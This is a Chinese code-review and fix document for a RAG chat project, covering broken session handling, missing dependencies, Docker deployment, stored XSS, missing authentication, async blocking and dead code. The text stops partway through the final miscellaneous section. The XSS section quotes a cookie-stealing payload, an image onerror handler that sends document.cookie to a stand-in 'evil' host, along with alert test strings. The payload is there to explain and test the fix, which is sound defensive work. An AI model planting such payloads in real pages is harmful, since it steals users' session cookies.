# 代码审查修复文档

> 审查日期：2026-08-28
> 审查分支：`feature/rag-engine`（已推送至 `origin/feature/rag-engine`）
> 审查范围：`src/` 全部模块、`main.py` / `app.py` / `api.py`、Dockerfile、docker-compose.yml、requirements.txt、配置文件
> 审查方式：人工通读 + 本地验证（import 测试、Pydantic 行为测试、`compileall`、密钥扫描）

---

## 问题总览

| # | 严重度 | 问题 | 位置 | 影响 |
|---|--------|------|------|------|
| 1 | 🔴 严重 | Web 端多轮对话与自定义提示词失效 | `app.py`、`src/api/chat_api.py` | 主打功能「多轮会话压缩」在 Web 端完全不生效 |
| 2 | 🔴 严重 | 缺失 `streamlit`、`docx2txt` 依赖 | `requirements.txt` | 新环境 clone 后无法运行；.docx 上传静默失败 |
| 3 | 🔴 严重 | Docker 部署坏损 | `Dockerfile`、`docker-compose.yml` | 容器启动即崩溃（`src/app.py` 不存在），FastAPI 无进程 |
| 4 | 🟠 安全 | 存储型 XSS | `app.py` | 上传恶意文档可在查看者浏览器执行脚本 |
| 5 | 🟠 安全 | 无鉴权 + CORS 配置不当 + 异常信息泄露 | `main.py`、API 层 | 公网部署即可被任意人清空知识库、盗刷 API Key |
| 6 | 🟡 性能 | async 接口内同步阻塞 | `src/services/` | 单个慢请求冻结整个事件循环 |
| 7 | 🟡 架构 | CLI 每轮重建事件循环 | `src/cli.py` | 现属侥幸可用，改动即坏 |
| 8 | 🔵 卫生 | 死代码与重复实现 | `src/core/`、`schemas.py` 等 | 维护混乱，两份 LLMClient 已漂移 |
| 9 | 🔵 卫生 | .gitignore 与已跟踪文件冲突 | `.gitignore` | 文档改动仍进 git，ignore 形同虚设 |
| 10 | 🔵 质量 | Rerank 模型不支持中文 | `src/rag/rerank.py` | 中文重排序基本无区分度 |
| 11 | ⚪ 轻微 | 杂项 | 多处 | 详见各小节 |

**建议修复顺序**：#1 → #4 → #2 → #3 → #5 → #6 → #7 → #8 → #9 → #10 → #11

---

## 1. 🔴 Web 端多轮对话与自定义提示词失效

### 问题描述

`app.py` 的 `api_chat()` 发送的 payload 包含 `history` 和 `system_prompt` 字段，但 API 的请求模型 `ChatRequest` 只定义了 7 个字段，**不包含这两个**。同时 `app.py` 从不传 `session_id`。

已在本地 venv 实测验证：Pydantic v2 默认 `extra="ignore"`，未知字段被**静默丢弃**，请求不会报错。

```
# 实测结果
extra fields silently ignored: True | system_prompt ignored: True
```

### 影响分析

- Web 界面每一轮请求都是"无记忆"请求——侧边栏的"自定义系统提示词"毫无作用；
- 最近两次提交（`72bf057`、`ec02eb4`）的核心功能「多轮会话压缩」**在 Web 端永远不会触发**：没有 `session_id` → 服务端 `append_turn()` / `MemoryManager` 永不执行，只有 CLI 能用；
- `app.py` 本地的 `history_mgr.save_session()` 写的是前端所在机器的 `chat_history/`，与服务端会话是两套割裂的数据（同一份功能存了两份且互不相认）。

### 修复步骤

**（1）`src/api/chat_api.py` — 给 `ChatRequest` 增加 `system_prompt` 字段：**

```python
class ChatRequest(BaseModel):
    """聊天请求"""
    message: str = Field(..., min_length=1, description="用户消息")
    session_id: Optional[str] = Field(None, description="会话ID")
    use_rag: bool = Field(True, description="是否使用RAG")
    provider: Optional[str] = Field(None, description="LLM提供商")
    model: Optional[str] = Field(None, description="模型名称")
    system_prompt: Optional[str] = Field(None, description="自定义系统提示词")   # 新增
    temperature: float = Field(0.7, ge=0.0, le=2.0, description="温度参数")
    max_tokens: int = Field(2048, ge=1, le=8192, description="最大token数")
```

可选加固：让未知字段直接报 422，避免这类"静默丢字段"的 bug 再次发生——

```python
from pydantic import ConfigDict

class ChatRequest(BaseModel):
    model_config = ConfigDict(extra="forbid")   # 发多余字段直接 422，尽早暴露前后端不一致
    ...
```

> 注意：加了 `extra="forbid"` 后，任何发送多余字段的旧客户端会立刻报错。这是有意的 fail-fast，但如果存在不受控的第三方调用方，可先不加。

**（2）`src/services/chat_service.py` — 透传 `system_prompt`：**

```python
async def chat(
    self,
    message: str,
    session_id: Optional[str] = None,
    use_rag: bool = True,
    provider: Optional[str] = None,
    model: Optional[str] = None,
    system_prompt: Optional[str] = None,      # 新增
    temperature: float = 0.7,
    max_tokens: int = 2048
) -> Tuple[str, List[str]]:
    ...
    answer = llm_client.chat(
        user_message=message,
        history=history,
        rag_context=rag_context,
        system_prompt=system_prompt or "你是一个智能助手，请用简洁准确的中文回答用户的问题。",
        temperature=temperature,
        max_tokens=max_tokens
    )
```

**（3）`src/api/chat_api.py` — 调用处传参：**

```python
answer, sources = await chat_service.chat(
    message=request.message,
    session_id=request.session_id,
    use_rag=request.use_rag,
    provider=request.provider,
    model=request.model,
    system_prompt=request.system_prompt,     # 新增
    temperature=request.temperature,
    max_tokens=request.max_tokens
)
```

**（4）`app.py` — 前端持有 `session_id`，payload 删除 `history`：**

服务端通过 `session_id` 自动加载历史，前端不再自行发送 `history`（否则等于双重记忆）：

```python
def api_chat(message: str, session_id: str, use_rag: bool,
             provider: str, model: str, system_prompt: str,
             temperature: float, max_tokens: int) -> tuple[str, list]:
    """调用 POST /chat/，返回 (answer, sources)"""
    payload = {
        "message": message,
        "session_id": session_id,        # 新增：服务端据此加载/保存会话记忆
        "use_rag": use_rag,
        "provider": provider,
        "model": model,
        "system_prompt": system_prompt,
        "temperature": temperature,
        "max_tokens": max_tokens,
        # "history" 字段删除：历史由服务端 session_id 提供
    }
    resp = httpx.post(f"{API_BASE}/chat/", json=payload, timeout=120)
    resp.raise_for_status()
    data = resp.json()
    return data["answer"], data.get("sources", [])
```

`init_session()` 生成会话 ID：

```python
def init_session():
    defaults = {
        "session_id": HistoryManager.new_session_id(),   # 新增
        "messages": [],
        ...
    }
```

调用处：

```python
answer, sources = api_chat(
    message=user_input,
    session_id=st.session_state.session_id,   # 新增
    use_rag=st.session_state.use_rag,
    ...
)
```

**（5）`app.py` — 底部删除本地双重保存：**

```python
st.session_state.messages.append({"role": "user",      "content": user_input, "sources": []})
st.session_state.messages.append({"role": "assistant", "content": answer,     "sources": sources})

# 删除以下两行 —— 持久化已由服务端 MemoryManager 完成：
# st.session_state.history_mgr.add(user_input, answer)
# st.session_state.history_mgr.save_session(st.session_state.messages)
```

`history_mgr` 仅保留两个用途：生成 session_id（`new_session_id`）、侧边栏列出/加载历史（见下）。

**（6）`app.py` — 「清空当前对话」「加载会话」接上 session_id：**

```python
if st.button("清空当前对话"):
    try:
        httpx.delete(f"{API_BASE}/chat/history/{st.session_state.session_id}", timeout=10)
    except Exception:
        pass   # 服务端不可达时仅清前端
    st.session_state.session_id = HistoryManager.new_session_id()   # 换新会话，避免继续写旧记忆
    st.session_state.messages = []
    st.rerun()
```

```python
if selected_session and st.button("加载会话"):
    loaded_msgs = st.session_state.history_mgr.load(selected_session)
    st.session_state.messages = [
        {"role": m["role"], "content": m["content"]}
        for m in loaded_msgs if m.get("role") in ("user", "assistant")   # 过滤 system 摘要消息
    ]
    st.session_state.session_id = selected_session   # 后续对话在该会话上继续
    st.rerun()
```

> 说明：`HistoryManager.load()` 返回的消息里可能含 `role="system"` 的摘要条目（来自 `build_messages_from_memory`），渲染循环会把它们画成 AI 气泡，所以加载时过滤掉。
> 另注：侧边栏"加载会话"读的是前端本地 `chat_history/` 目录。本地跑（Streamlit 与 API 同机）天然一致；Docker 部署见第 3 项的共享挂载方案。

### 验证方法

1. 启动 `python main.py` + `streamlit run app.py`；
2. Web 界面先问"我叫小明"，再问"我叫什么"——第二问应能答出"小明"（修复前必答不出）；
3. 检查 `chat_history/` 下出现 `<session_id>.json`，内容为含 `memory` 字段的结构化记忆；
4. 侧边栏修改系统提示词为"你必须只用英文回答"，确认回答语言随之改变；
5. 观察长对话若干轮后 `rolling_summary` 非空（多轮压缩真正生效）。

---

## 2. 🔴 缺失依赖：`streamlit`、`docx2txt`

### 问题描述

- `Dockerfile` 的 CMD 就是 `streamlit run ...`，`README.md` 的启动命令也含 `streamlit run app.py`，但 `requirements.txt` 里**没有 `streamlit`**——干净环境装完依赖跑不起来，Docker 构建出的镜像运行时直接 `command not found`。
- `DocumentLoader` 用 `Docx2txtLoader` 处理 .docx，而该 loader 在 `load()` 时才 `import docx2txt`（lazy import），本 venv 已实测未安装、requirements 里也没有。上传 .docx 时异常被 `rag_engine.build_index` 的 per-file `except` 吞掉（`rag_engine.py:81-82`），**接口返回"上传成功"，实际 0 chunks，静默失败**。
- 顺带：`.doc`（老 OLE2 二进制格式）被列入 `SUPPORTED_EXTENSIONS`，但 docx2txt 实际只能解 .docx（本质是解 zip 读 `document.xml`），.doc 必然解析失败。

另外本地 venv 与 requirements 已漂移（venv: fastapi 0.135.2 / pydantic 2.12.5 / streamlit 1.55.0；requirements 钉的是 0.115.6 / 2.10.5），说明当前 venv 不是从这份 requirements 装出来的。**依赖声明与实际运行环境不一致本身就是隐患**，建议择一处理：把 requirements 对齐到已验证版本，或用 requirements 重建 venv 全量回归一遍。

### 修复步骤

**（1）`requirements.txt` 增补：**

```diff
 # 前端（Dockerfile CMD 与 README 启动命令都依赖它）
+streamlit==1.55.0

 # DOCX 解析（langchain Docx2txtLoader 的运行时依赖）
+docx2txt==0.36
```

**（2）`src/index/document_loader.py` — 移除 `.doc` 支持：**

```python
class DocumentLoader:
    """文档加载器，支持 PDF、TXT、MD、DOCX 格式"""

    SUPPORTED_EXTENSIONS = {".pdf", ".txt", ".md", ".docx"}   # 移除 .doc
```

```python
if suffix == ".pdf":
    loader = PyPDFLoader(str(path))
elif suffix in {".txt", ".md"}:
    loader = TextLoader(str(path), encoding="utf-8")
elif suffix == ".docx":
    loader = Docx2txtLoader(str(path))
else:
    raise ValueError(f"不支持的文件格式: {suffix}")
```

> 如确实需要 .doc 支持：用 LibreOffice headless 预转换（`soffice --headless --convert-to docx`），不要指望 docx2txt。`.streamlit` 上传组件与 `app.py` 的 `type=[...]` 目前本来就只列了 txt/pdf/md/docx，前后一致。

### 验证方法

1. 新建干净 venv：`python -m venv v2 && v2\Scripts\pip install -r requirements.txt`；
2. `streamlit run app.py` 能正常起页面；
3. 上传一个 .docx → 响应里 `total_chunks > 0`，日志出现 `[RAGEngine] 文件切块完成 source=xxx.docx chunks=N`；
4. 上传一个 .doc → 收到明确的"不支持的文件格式"失败条目，而不是静默 0 chunks。

---

## 3. 🔴 Docker 部署坏损

### 问题描述

三处硬伤，任何一处都让 `docker compose up` 无法得到可用服务：

1. `Dockerfile:42`：`CMD ["streamlit", "run", "src/app.py", ...]` —— **仓库里不存在 `src/app.py`**，入口在根目录 `app.py`，容器启动即 crash；
2. compose 只启动了一个 Streamlit 服务，而 `app.py` 的所有功能都靠 HTTP 调 `http://127.0.0.1:8000`（FastAPI）——容器里没有任何进程在跑 FastAPI，映射的 8000 端口无进程监听；
3. `app.py:25` 把 `API_BASE` 写死为 `http://127.0.0.1:8000`，无法通过环境变量指向别的容器。

另外：`docker-compose.yml` 的 `version: '3.8'` 字段在 Compose V2 已废弃（会告警）；Dockerfile 的 HEALTHCHECK 只检查 8501，与"API + Web 双进程"的现实不符（改双服务后各自检查各自的端口，放 compose 里更合适）。

### 修复步骤

**（1）`app.py` — API 地址改为环境变量：**

```python
import os

API_BASE = os.getenv("API_BASE", "http://127.0.0.1:8000")
```

**（2）`Dockerfile` — 默认启动 API，Web 由 compose 覆盖命令：**

```dockerfile
FROM python:3.11-slim

WORKDIR /app

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    PIP_NO_CACHE_DIR=1 \
    HF_ENDPOINT=https://hf-mirror.com

RUN apt-get update && apt-get install -y \
    gcc g++ curl \
    && rm -rf /var/lib/apt/lists/*

COPY requirements.txt .
RUN pip install --upgrade pip && \
    pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple

COPY . .

RUN mkdir -p chat_history knowledge_base vector_db

EXPOSE 8000 8501

ENV PYTHONPATH=/app

# 健康检查移到 compose（两个服务检查不同端口）
# 默认启动 API；Web 服务通过 compose 的 command 覆盖
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

**（3）`docker-compose.yml` — 拆成 api + web 两个服务：**

```yaml
services:
  # ========== FastAPI 后端 ==========
  api:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: ai-qa-api
    restart: unless-stopped
    command: uvicorn main:app --host 0.0.0.0 --port 8000
    ports:
      - "8000:8000"
    env_file:
      - .env
    environment:
      - HF_ENDPOINT=https://hf-mirror.com
    volumes:
      - ./chat_history:/app/chat_history       # 聊天记录
      - ./knowledge_base:/app/knowledge_base   # 知识库文档
      - ./vector_db:/app/vector_db             # 向量数据库
      - ./hf_cache:/root/.cache/huggingface    # Embedding/Rerank 模型缓存
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 120s    # 首次启动需下载 embedding 模型，给足时间
    deploy:
      resources:
        limits:
          memory: 4G
        reservations:
          memory: 1G

  # ========== Streamlit 前端 ==========
  web:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: ai-qa-web
    restart: unless-stopped
    command: streamlit run app.py --server.port=8501 --server.address=0.0.0.0 --server.headless=true
    ports:
      - "8501:8501"
    env_file:
      - .env
    environment:
      - API_BASE=http://api:8000    # 通过服务名访问 API 容器
    volumes:
      # 与 api 共享同一宿主目录：侧边栏"历史会话"列表读的是这里
      - ./chat_history:/app/chat_history
    depends_on:
      - api
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8501/_stcore/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s

networks:
  default:
    name: ai-qa-network
```

要点说明：

- `version: '3.8'` 行删除；
- `chat_history` 同一宿主目录挂给两个容器：API 写会话文件，Web 的 `HistoryManager.list_sessions()/load()` 读同一份，侧边栏功能得以保留；
- `vector_db` / `hf_cache` 只挂 api（只有 api 进程碰向量库和模型）；
- Streamlit 容器无需 gcc/g++ 等编译链，复用同一镜像虽略有冗余但省维护，追求精简可后续拆两个 Dockerfile。

**（4）`docs/usage.md` 同步修正：**

- `streamlit run src/app.py` → `streamlit run app.py`；
- 引用了仓库中不存在的 `start.bat` / `start.sh` —— 要么补上这两个脚本，要么删掉对应说明；
- 补充双进程启动说明：先 `python main.py`（或 `uvicorn main:app`）再 `streamlit run app.py`。

### 验证方法

```bash
docker compose up -d --build
curl http://localhost:8000/health          # {"status":"healthy",...}
# 浏览器打开 http://localhost:8501，侧边栏应显示"✅ API 服务已连接"
# 上传文档 -> 聊天 -> 侧边栏出现会话记录
docker compose ps                          # 两个容器均 healthy
```

---

## 4. 🟠 前端存储型 XSS

### 问题描述

`app.py` 共 4 处把用户输入和 AI 回答**未经 HTML 转义**直接插入 `unsafe_allow_html=True` 的 `st.markdown`（`app.py:302/307/322/347`）。攻击链完整：

```
上传含 <img src=x onerror=fetch('https://evil/'+document.cookie)> 的知识库文档
  → RAG 检索命中该 chunk → 拼入回答 → 未转义渲染 → 查看聊天的所有人浏览器执行脚本
```

且 `.streamlit/config.toml` 中 `enableXsrfProtection = false` 放大了风险。

### 修复步骤

**（1）`app.py` — 渲染统一走一个转义函数：**

```python
import html

def render_message(role: str, content: str, sources: list | None = None) -> None:
    """渲染聊天气泡。所有动态内容必须 html.escape，防 XSS。"""
    if role == "user":
        st.markdown(
            f'<div class="chat-user">🧑 <b>你</b><br>{html.escape(content)}</div>',
            unsafe_allow_html=True,
        )
    else:
        st.markdown(
            f'<div class="chat-ai">🤖 <b>AI</b><br>{html.escape(content)}</div>',
            unsafe_allow_html=True,
        )
        if sources:
            src_html = "<br>".join(f"• {html.escape(s)}" for s in sources)
            st.markdown(
                f'<div class="source-box">📄 参考来源：<br>{src_html}</div>',
                unsafe_allow_html=True,
            )
```

替换全部 4 处内联渲染（历史消息循环 2 处 + 输入后即时渲染 2 处）为：

```python
render_message("user", user_input)
...
render_message("assistant", answer, sources)
```

> 更彻底的替代方案：改用 `st.chat_message(role)` + `st.markdown(content)`（默认转义），并配 `st.chat_input`。会失去现有自定义 CSS 气泡样式，但安全性由框架保证、代码更短。二选一即可。

**（2）`.streamlit/config.toml` — 恢复 XSRF 防护：**

```toml
enableXsrfProtection = true
```

### 验证方法

发送消息 `<img src=x onerror=alert(1)>` 与 `<script>alert(1)</script>`：应原样显示为文本，不弹窗。再上传一份含同样 payload 的 .txt 文档并触发 RAG 命中，确认回答渲染同样安全。

---

## 5. 🟠 鉴权缺失、CORS 不当、异常信息泄露

### 问题描述

- 所有端点无任何鉴权：`DELETE /upload/clear` 可被任意人调用清空整个知识库与索引；`GET /chat/history/{id}` 可遍历读取任意会话（聊天记录属隐私数据）；`POST /chat` 会消耗你的 API Key 额度；
- `main.py:66-72`：`allow_origins=["*"]` 与 `allow_credentials=True` 组合不符合 CORS 规范（带凭证时浏览器会直接拒绝通配符 origin），纯属无效配置；
- 所有 500 响应都把原始异常 `str(e)` 回给客户端（`chat_api.py:103`、`upload_api.py:92` 等），向外界泄露内部路径、依赖栈信息。

### 修复步骤

**（1）`src/infra/config.py` — 新增配置：**

```python
# API 鉴权（为空 = 不启用，本地开发用；公网部署务必设置）
API_AUTH_TOKEN = os.getenv("API_AUTH_TOKEN", "")
# CORS 白名单，逗号分隔
CORS_ORIGINS = [
    origin.strip()
    for origin in os.getenv("CORS_ORIGINS", "http://localhost:8501").split(",")
    if origin.strip()
]
```

**（2）`main.py` — Token 校验 + CORS 修正：**

```python
from typing import Optional
from fastapi import Depends, FastAPI, HTTPException, Security
from fastapi.security import APIKeyHeader
from src.infra.config import API_AUTH_TOKEN, CORS_ORIGINS

api_key_header = APIKeyHeader(name="X-API-Token", auto_error=False)


async def verify_token(token: Optional[str] = Security(api_key_header)) -> None:
    """配置了 API_AUTH_TOKEN 时，要求请求头 X-API-Token 与之匹配。"""
    if API_AUTH_TOKEN and token != API_AUTH_TOKEN:
        raise HTTPException(status_code=401, detail="未授权")

app = FastAPI(...)

app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ORIGINS,     # 显式白名单，不用通配符
    allow_methods=["*"],
    allow_headers=["*"],
    # allow_credentials 删除：当前前后端均用不到 Cookie 凭证
)

# 路由级鉴权（根路径 / /health 保持开放，供健康检查）
app.include_router(chat_router, dependencies=[Depends(verify_token)])
app.include_router(upload_router, dependencies=[Depends(verify_token)])
```

**（3）`app.py` — 前端带上 Token：**

```python
API_TOKEN = os.getenv("API_AUTH_TOKEN", "")
HEADERS = {"X-API-Token": API_TOKEN} if API_TOKEN else {}

# 所有 httpx 调用补上 headers=HEADERS，例如：
resp = httpx.post(f"{API_BASE}/chat/", json=payload, headers=HEADERS, timeout=120)
```

**（4）API 层 — 500 不回传原始异常：**

```python
    except Exception as e:
        logger.error(f"[ChatAPI] 聊天失败: {e}", exc_info=True)   # 日志里保留完整堆栈
        raise HTTPException(status_code=500, detail="聊天失败，请稍后重试")   # 客户端只给通用文案
```

`upload_api.py` 的 3 处 `except` 同样处理。

### 验证方法

```bash
# 未配置 API_AUTH_TOKEN（默认）：行为与现在一致
# 配置后：
export API_AUTH_TOKEN=secret123
curl -X DELETE http://localhost:8000/upload/clear                 # → 401
curl -X DELETE http://localhost:8000/upload/clear -H "X-API-Token: secret123"  # → 200
curl http://localhost:8000/health                                  # → 200（不受鉴权影响）
```

> 注意：`X-API-Token` 是自定义 header，浏览器跨域时会触发 CORS 预检，需确认 `allow_headers=["*"]` 已覆盖（上面配置已含）。公网部署还应置于 HTTPS 之后，否则 Token 明文传输。

---

## 6. 🟡 async 接口内的同步阻塞调用

### 问题描述

`ChatService.chat` 与 `UploadService.upload_and_index` 是 `async`，但内部调用全是**同步阻塞**：

| 调用 | 阻塞性质 | 典型耗时 |
|------|----------|----------|
| `llm_client.chat()`（同步 OpenAI 客户端） | 网络 I/O | 数秒~数十秒 |
| `rag_engine.get_context_with_sources()` | CPU（embedding + BM25 + CrossEncoder） | 数秒 |
| `memory_manager.append_turn()` | **又是一轮 LLM 网络调用**（压缩摘要） | 数秒 |

一个聊天请求处理期间，**整个 FastAPI 事件循环被冻结**：健康检查无响应、其他用户的请求全部排队，并发能力实际为 1。`build_index`（上传触发，含 embedding 全量计算）同理。

### 修复步骤

用 `asyncio.to_thread` 把阻塞段扔进线程池，事件循环即刻释放。改动量小、行为不变。

**（1）`src/services/chat_service.py`：**

```python
import asyncio

        # 2. RAG检索
        if use_rag and self.rag_engine.is_ready():
            try:
                rag_context, sources = await asyncio.to_thread(
                    self.rag_engine.get_context_with_sources, message
                )
            ...

        # 4. 调用LLM
        answer = await asyncio.to_thread(
            llm_client.chat,
            user_message=message,
            history=history,
            rag_context=rag_context,
            system_prompt=system_prompt or "你是一个智能助手，请用简洁准确的中文回答用户的问题。",
            temperature=temperature,
            max_tokens=max_tokens,
        )

        # 5. 保存历史（内部含压缩用的 LLM 调用，同样阻塞）
        if session_id:
            await asyncio.to_thread(
                self.memory_manager.append_turn,
                session_id=session_id,
                user=message,
                assistant=answer,
                provider=llm_client.provider,
                model=llm_client.model,
                meta={"provider": llm_client.provider, "model": llm_client.model},
            )
```

**（2）`src/services/upload_service.py`：**

```python
import asyncio

            total_chunks = await asyncio.to_thread(
                self.rag_engine.build_index, saved_paths
            )
```

补充说明：

- `asyncio.to_thread` 走默认线程池（容量约 `min(32, cpu+4)`），对演示级并发足够；追求更高吞吐再考虑 `AsyncOpenAI` 客户端（LLM 调用）与异步向量库客户端；
- 并发后多个请求可能同时进入 embedding/CrossEncoder 推理，sentence-transformers 推理本身线程安全，但**若未来加入并发写索引**，建议给 `ChromaStore` 的写操作加 `threading.Lock`（Chroma 的 SQLite 后端不宜并发写）；
- `main.py` 的 `/health` 里 `list_sources()` 会全量拉 metadata，量大了也卡事件循环，可一并 `to_thread` 或改用 `collection.count()`。

### 验证方法

```bash
# 终端 1：发起一个慢请求（问一个需要长回答的问题）
curl -X POST http://localhost:8000/chat/ -H "Content-Type: application/json" \
     -d '{"message":"详细介绍RAG的原理"}' &
# 终端 2：慢请求未返回期间健康检查必须立即响应（修复前会挂起直到聊天完成）
curl -m 2 http://localhost:8000/health
```

---

## 7. 🟡 CLI 每轮重建事件循环

### 问题描述

`src/cli.py:181` 在 REPL 的 `while True` 里每轮 `asyncio.run(chat_service.chat(...))`，`finally` 里又 `asyncio.run(container.shutdown())`——同一进程反复 create/destroy 事件循环。当前能跑只是因为底层全是同步代码、循环里没留待办任务，纯属侥幸；一旦 chat 内部出现任何跨 `await` 的资源（如 AsyncOpenAI 客户端、锁），立刻报 "attached to a different loop"。

### 修复步骤

整个 REPL 包进**一个**事件循环：

```python
async def _chat_repl(provider: str, model: str, use_rag: bool, session_id: str) -> None:
    container = get_container()
    await container.startup()
    chat_service = container.chat_service()
    rag_engine = container.rag_engine()
    history_manager = container.history_manager()

    try:
        _show_help()
        while True:
            user_input = console.input("[bold green]你[/bold green]: ").strip()
            if not user_input:
                continue

            if user_input.startswith("/"):
                ...  # 各命令分支原样保留，不变

            answer, sources = await chat_service.chat(     # ← 直接 await，不再 asyncio.run
                message=user_input,
                session_id=session_id,
                use_rag=use_rag,
                provider=provider,
                model=model,
            )
            console.print(f"[bold blue]AI[/bold blue]: {answer}")
            if sources:
                console.print("[dim]来源: " + "、".join(sources) + "[/dim]")
    finally:
        await container.shutdown()


@app.command()
def chat(
    provider: str = typer.Option(DEFAULT_PROVIDER, "--provider", "-p"),
    model: str = typer.Option(DEFAULT_MODEL, "--model", "-m"),
    rag: bool = typer.Option(True, "--rag/--no-rag"),
    session: Optional[str] = typer.Option(None, "--session", "-s"),
):
    """启动交互式命令行问答。"""
    console.print(Panel("RAG 知识库问答 CLI\n输入 /help 查看命令", title="AI QA", expand=False))
    session_id = session or HistoryManager.new_session_id()
    asyncio.run(_chat_repl(provider, model, rag, session_id))   # 全进程唯一一次 asyncio.run
```

`/new` 命令改为重新赋值闭包内的 `session_id`（可用 `nonlocal` 或把 session_id 收进一个可变容器）。

### 验证方法

CLI 连续多轮对话、`/new` 切会话、`/rag build`、`/exit` 正常退出无异常栈；退出后无 "Event loop is closed" 之类警告。

---

## 8. 🔵 死代码与重复实现清理

### 问题描述

以下模块**零引用**且与现行实现已漂移，属于历史遗留：

| 文件 | 问题 |
|------|------|
| `src/core/` 整个包 | `llm_client.py` 与 `src/infra/llm_client.py` 是旧副本，**两份的 RAG 提示词已经不一样**（core 版说"可结合自身知识"，infra 版说"严格基于参考资料"）；`storage.py:9` import 了 requirements 里没有的 `aiofiles` |
| `src/api/schemas.py` | API 各文件自定义了自己的模型，此文件无人 import；且用了 Pydantic v2 已废弃的 `Field(example=...)`（应为 `json_schema_extra`） |
| `src/rag/prompt_builder.py` | 无人使用；prompt 实际在 `llm_client.chat` 里拼接，两处系统提示词语义互相矛盾 |
| `src/services/session_service.py` | 无人使用；且绕过 DI 容器自己 `new HistoryManager()` |
| `update.md` | 与 `docs/architecture.md` 重复且已漂移 |

### 修复步骤

```bash
git rm -r src/core
git rm src/api/schemas.py
git rm src/rag/prompt_builder.py
git rm src/services/session_service.py
git rm update.md
```

同步修改：

- `src/services/__init__.py` 删除 `SessionService` 的 import 与导出；
- `docs/architecture.md` 的目录树删除 `core/`、`schemas.py`、`prompt_builder.py`、`session_service.py` 条目。

关于 prompt 模板：短期方案是把模板留在 `llm_client.chat`（唯一一处）；若想统一管理，正确姿势是 `ChatService` 用 `PromptBuilder` 拼最终 user 消息、`llm_client.chat` 只收纯 messages 不再自己拼 RAG 前缀——这是独立的小重构，不与本次清理捆绑。

> 提示：`session_service.py` 若将来要给前端提供会话列表 API，正确做法是注册进 Container 并加 `GET /chat/sessions` 端点，而不是像现在这样自建 HistoryManager。

### 验证方法

```bash
grep -rn "src.core\|schemas\|prompt_builder\|SessionService" --include="*.py" src main.py app.py api.py
# 应无匹配
./venv/Scripts/python.exe -m compileall -q src main.py app.py api.py && echo OK
python main.py 起服务冒烟
```

---

## 9. 🔵 .gitignore 与已跟踪文件冲突

### 问题描述

`.gitignore` 里有 `docs/` 和 `.codex`，但这些文件**已被 git 跟踪**——gitignore 只对未跟踪文件生效，已跟踪文件的改动照常出现在 `git status` 里，ignore 形同虚设（这正是当前工作区 `docs` 相关改动仍会被提交的原因）。且 `README.md:85` 链接到 `docs/architecture.md`，如果真的不跟踪 docs，克隆者将看到死链。

### 修复步骤

推荐方向：**docs 保留跟踪**（README 引用它，架构文档是项目资产），`.codex` 取消跟踪：

```diff
 # .gitignore
-.codex
-
-# docs文件
-
-docs/
+ # docs/ 保留跟踪（README 链接 architecture.md）
+ # .codex 为本地工具文件，取消跟踪：
```

```bash
git rm --cached .codex    # 从索引移除但保留本地文件
```

如确想移除 docs（不推荐，理由如上）：

```bash
git rm -r --cached docs
# 并删除 README.md 中的 architecture.md 链接
```

`tools/`（本地评测脚本 `tools/rag_eval.py`）保持 ignore 即可，注意它被 ignore 后不会出现在 clone 里，README 若宣传过该工具需补充说明。

### 验证方法

`git status` 干净后：修改 `docs/architecture.md` 应出现在 changes 里（保留跟踪的预期行为）；`.codex` 的任何变动不再出现。

---

## 10. 🔵 Rerank 模型不支持中文

### 问题描述

`src/rag/rerank.py:16` 默认模型 `cross-encoder/ms-marco-MiniLM-L-6-v2` 是**纯英文**模型（MS MARCO 英文数据训练），而整个系统面向中文（embedding 特意选了多语言的 `paraphrase-multilingual-MiniLM-L12-v2`）。中文 query-文档对送入英文 CrossEncoder，打出的分数基本没有区分度——重排序层形同虚设，白花推理时间。

### 修复步骤

**（1）`src/infra/config.py`：**

```python
# 重排序模型（中英文均支持；追求质量可换 BAAI/bge-reranker-v2-m3，约 2.2GB）
RERANK_MODEL = os.getenv("RERANK_MODEL", "BAAI/bge-reranker-base")
```

**（2）`src/container.py`：**

```python
from src.infra.config import (..., RERANK_MODEL, ...)

            self._rag_engine = RAGEngine(
                vector_store=self.vector_store(),
                document_loader=self.document_loader(),
                ...
                rerank_model=RERANK_MODEL,     # 新增
            )
```

**（3）`src/rag/rag_engine.py`：**

```python
    def __init__(
        self,
        vector_store: VectorStore,
        document_loader: DocumentLoader,
        ...
        rerank_model: str = "BAAI/bge-reranker-base",   # 新增参数
    ):
        ...
        self.reranker = Reranker(model_name=rerank_model)
```

**（4）`src/rag/rerank.py`：**

```python
DEFAULT_RERANK_MODEL = "BAAI/bge-reranker-base"   # 原 cross-encoder/ms-marco-MiniLM-L-6-v2
```

备注：

- `bge-reranker-base`（约 1.1GB，中英）是体积/质量的平衡点；`bge-reranker-v2-m3`（约 2.2GB，多语言）更强，改一个环境变量即可切换——这也是把模型名做成配置的意义；
- CrossEncoder 输出的是原始 logits（可为负），代码按分数排序，无需改动排序逻辑；
- Docker 部署时模型首次下载需要时间，compose 中 api 的 `start_period` 已相应放宽（见第 3 项），`hf_cache` 卷挂载可避免重复下载。

### 验证方法

用中文知识库查询，观察 `[Reranker]` 日志耗时增加（模型变大）且结果质量变化；可临时在 `rerank()` 里加 `logger.debug` 打印各候选的 `rerank_score`，确认中文候选间分数有明显梯度（修复前英文模型对中文输入的分数几乎同值）。

---

## 11. ⚪ 杂项（顺手修，不阻塞）

**（1）`context_filter.py:51` 超长即整体停止**：`break` 导致上下文经常填不满（如剩余额度 200 字、下一块 300 字时直接收工）。可改为 `continue` 跳过本块继续尝试更小的块。注意 chunks 是按相关性降序的，`continue` 会引入"低相关性小块挤掉高相关性大块被截断"的权衡，两者皆可，选定后加注释说明意图。

**（2）`retriever.py` 的 `rank_offset` 系统性压制改写 query**：`rank_offset += top_k` 使第二个 query（关键词改写版）的 rank 1 实际计为 `top_k + 1`，永远排在原始 query 的结果之后。若非有意设计，删掉 `rank_offset`、让多 query 命中时取最优名次即可；若有意偏向原始 query，请加注释写明。

```python
# _dense_recall / _sparse_recall 中均删除 rank_offset，比较改为：
